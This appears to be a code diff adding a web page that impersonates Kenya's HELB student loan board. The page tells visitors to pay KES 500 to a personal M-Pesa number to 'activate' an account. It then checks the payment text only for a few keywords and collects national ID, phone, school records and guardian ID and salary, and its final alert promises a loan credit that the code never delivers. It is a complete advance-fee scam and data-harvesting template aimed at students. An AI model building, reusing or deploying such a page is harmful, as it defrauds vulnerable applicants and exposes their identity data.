@@ -1,0 +1,278 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HELB Loan Application</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f8;
+      margin: 0;
+      padding: 0;
+    }
+    marquee {
+      background: red;
+      color: white;
+      padding: 10px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 500px;
+      background: #fff;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2, h3, h4 {
+      text-align: center;
+      color: #007bff;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .hidden {
+      display: none;
+    }
+    .notice {
+      background: #e0f7fa;
+      padding: 10px;
+      margin-bottom: 20px;
+      border-left: 5px solid #007bff;
+    }
+    .fullscreen-notice {
+      position: fixed;
+      top: 0;
+      left: 0;
+      background: #fff3cd;
+      color: #856404;
+      width: 100vw;
+      height: 100vh;
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+    .fullscreen-notice .inner {
+      max-width: 400px;
+      background: white;
+      border: 2px solid #ffeeba;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    }
+    .summary-box {
+      background: #f0f8ff;
+      padding: 15px;
+      border-radius: 6px;
+      font-size: 15px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<marquee>⚠️ Warning: Users who edit or submit fake M-Pesa messages will not access the HELB loan!</marquee>
+
+<div id="mpesaNotification" class="fullscreen-notice">
+  <div class="inner">
+    <h2>🔔 M-PESA Activation Instructions</h2>
+    <p>
+      Click on <b>M-Pesa</b> → <b>Lipa na M-Pesa</b> → <b>Pochi la Biashara</b><br />
+      Account Number: <b>0724176154</b><br />
+      Amount: <b>KES 500</b><br />
+      Secretary Name: <b>Kamau Charity Mukami</b><br /><br />
+      Activate account to access a <b>HELB loan of KES 30,000 – 100,000</b><br />
+      (depending on your guardian’s level of income)
+    </p>
+    <button onclick="closeNotification()" style="margin-top:20px;">Skip Ad</button>
+  </div>
+</div>
+
+<div class="container">
+  <h2>HELB Loan Application</h2>
+
+  <div id="step-register">
+    <div class="notice">
+      Send <strong>KES 500</strong> to M-Pesa Pochi <strong>0724176154</strong> and paste your message below.
+    </div>
+    <input type="text" id="name" placeholder="Your Full Name" />
+    <input type="text" id="idNumber" placeholder="Your National ID Number" />
+    <input type="tel" id="phone" placeholder="Your M-Pesa Number" />
+    <label><b>Paste M-Pesa Message</b></label>
+    <textarea id="mpesaMessage" rows="4" placeholder="e.g. QFG12C123 Confirmed. Ksh500.00 sent to Kamau Charity Mukami on..."></textarea>
+    <button onclick="activateAccount()">Activate & Proceed</button>
+  </div>
+
+  <div id="step-helb" class="hidden">
+    <h3>Application Form</h3>
+    <input type="text" id="school" placeholder="School Name" />
+    <input type="text" id="course" placeholder="Course Name" />
+    <select id="year">
+      <option value="">Select Year of Study</option>
+      <option>Year 1</option>
+      <option>Year 2</option>
+      <option>Year 3</option>
+      <option>Year 4</option>
+    </select>
+    <input type="text" id="kcseYear" placeholder="KCSE Year (e.g. 2023)" />
+    <input type="text" id="kcseIndex" placeholder="KCSE Index Number" />
+    <select id="gender">
+      <option value="">Select Gender</option>
+      <option>Male</option>
+      <option>Female</option>
+      <option>Other</option>
+    </select>
+    <input type="date" id="dob" />
+    <input type="text" id="county" placeholder="County of Residence" />
+    <select id="govSponsored">
+      <option value="">Government-sponsored?</option>
+      <option>Yes</option>
+      <option>No</option>
+    </select>
+    <textarea id="reasons" rows="3" placeholder="Why do you need the loan?"></textarea>
+
+    <h4>Family Background</h4>
+    <input type="number" id="siblings" placeholder="Total number of siblings" />
+    <input type="number" id="siblingsInSchool" placeholder="Siblings currently in school" />
+    <select id="parentsAlive">
+      <option value="">Are your parents alive?</option>
+      <option>Both alive</option>
+      <option>One alive</option>
+      <option>None</option>
+    </select>
+    <select id="livesWith">
+      <option value="">Who do you live with?</option>
+      <option>Parents</option>
+      <option>Guardian</option>
+      <option>Other</option>
+    </select>
+
+    <h4>Guardian Details</h4>
+    <input type="text" id="guardianName" placeholder="Guardian Full Name" />
+    <input type="text" id="guardianId" placeholder="Guardian ID Number" />
+    <input type="text" id="guardianJob" placeholder="Guardian Occupation" />
+    <input type="number" id="guardianSalary" placeholder="Guardian Monthly Salary (KES)" />
+
+    <button onclick="showSummary()">Review Before Submit</button>
+  </div>
+
+  <div id="step-summary" class="hidden">
+    <h3>Confirm Your Information</h3>
+    <div id="summaryBox" class="summary-box"></div>
+    <button onclick="finalSubmit()">Confirm & Submit</button>
+  </div>
+
+  <div id="success" class="hidden">
+    <h3>✅ Application Submitted</h3>
+    <p>Your HELB loan aplication is being aproved please wait confirmation message.</p>
+  </div>
+</div>
+
+<script>
+  setTimeout(closeNotification, 30000);
+  function closeNotification() {
+    document.getElementById("mpesaNotification").style.display = "none";
+  }
+
+  function activateAccount() {
+    const name = document.getElementById("name").value.trim();
+    const id = document.getElementById("idNumber").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const message = document.getElementById("mpesaMessage").value.trim();
+
+    if (!name || !id || !phone || !message) {
+      alert("Please fill all fields and paste your M-Pesa message.");
+      return;
+    }
+
+    const msg = message.toLowerCase();
+    if (!msg.includes("confirmed") || !msg.includes("500") || !msg.includes("kamau")) {
+      alert("M-Pesa message must include: 'Confirmed', '500', and 'Kamau Charity'.");
+      return;
+    }
+
+    localStorage.setItem("helbUser", JSON.stringify({
+      name, id, phone, message
+    }));
+
+    document.getElementById("step-register").classList.add("hidden");
+    document.getElementById("step-helb").classList.remove("hidden");
+  }
+
+  function showSummary() {
+    const fields = [
+      "school", "course", "year", "kcseYear", "kcseIndex", "gender",
+      "dob", "county", "govSponsored", "reasons", "siblings", "siblingsInSchool",
+      "parentsAlive", "livesWith", "guardianName", "guardianId", "guardianJob", "guardianSalary"
+    ];
+    for (let field of fields) {
+      if (!document.getElementById(field).value) {
+        alert("Please complete all fields.");
+        return;
+      }
+    }
+
+    const user = JSON.parse(localStorage.getItem("helbUser"));
+    const values = {};
+    fields.forEach(f => values[f] = document.getElementById(f).value);
+
+    let summary = `
+      <b>Name:</b> ${user.name}<br>
+      <b>ID Number:</b> ${user.id}<br>
+      <b>Phone:</b> ${user.phone}<br><br>
+      <b>M-Pesa Message:</b><br><i>${user.message}</i><br><hr>
+      <b>School:</b> ${values.school}<br>
+      <b>Course:</b> ${values.course}<br>
+      <b>Year:</b> ${values.year}<br>
+      <b>KCSE Year:</b> ${values.kcseYear}<br>
+      <b>Index Number:</b> ${values.kcseIndex}<br>
+      <b>Gender:</b> ${values.gender}<br>
+      <b>DOB:</b> ${values.dob}<br>
+      <b>County:</b> ${values.county}<br>
+      <b>Gov Sponsored:</b> ${values.govSponsored}<br>
+      <b>Reason:</b> ${values.reasons}<br><hr>
+      <b>Siblings:</b> ${values.siblings}<br>
+      <b>In School:</b> ${values.siblingsInSchool}<br>
+      <b>Parents Alive:</b> ${values.parentsAlive}<br>
+      <b>Lives With:</b> ${values.livesWith}<br><hr>
+      <b>Guardian:</b> ${values.guardianName}<br>
+      <b>Guardian ID:</b> ${values.guardianId}<br>
+      <b>Job:</b> ${values.guardianJob}<br>
+      <b>Salary:</b> KES ${values.guardianSalary}<br>
+    `;
+
+    document.getElementById("summaryBox").innerHTML = summary;
+    localStorage.setItem("loanData", JSON.stringify({ ...user, ...values }));
+    document.getElementById("step-helb").classList.add("hidden");
+    document.getElementById("step-summary").classList.remove("hidden");
+  }
+
+  function finalSubmit() {
+    const data = JSON.parse(localStorage.getItem("loanData"));
+    console.log("Submitted:", data);
+    alert("Thank you! Your HELB loan will be credited to your M-Pesa number within 3rd of August 2025.");
+    document.getElementById("step-summary").classList.add("hidden");
+    document.getElementById("success").classList.remove("hidden");
+  }
+</script>
+</body>
+</html>
